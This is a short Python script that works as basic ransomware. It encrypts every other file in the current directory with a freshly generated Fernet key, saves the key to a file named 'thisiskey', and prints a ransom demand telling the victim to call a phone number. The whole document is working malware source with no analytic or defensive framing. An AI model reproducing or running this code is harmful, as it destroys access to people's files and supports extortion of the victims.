import os
from cryptography.fernet import Fernet as f

files=[]
for file in os.listdir():
    if file=="encrypt" or file=="thisiskey" or file=="decrypt":
        continue
    if os.path.isfile(file):
        files.append(file)
key=f.generate_key()
with open("thisiskey","wb") as k:
    k.write(key)
for i in files:
    with open(i,"rb") as l:
        contents=l.read()
    new=f(key).encrypt(contents)
    with open(i,"wb") as h:
        h.write(new)
print("the files have been encrypted using 128 AES encryption, call at this number (666666666) to get it fixed")
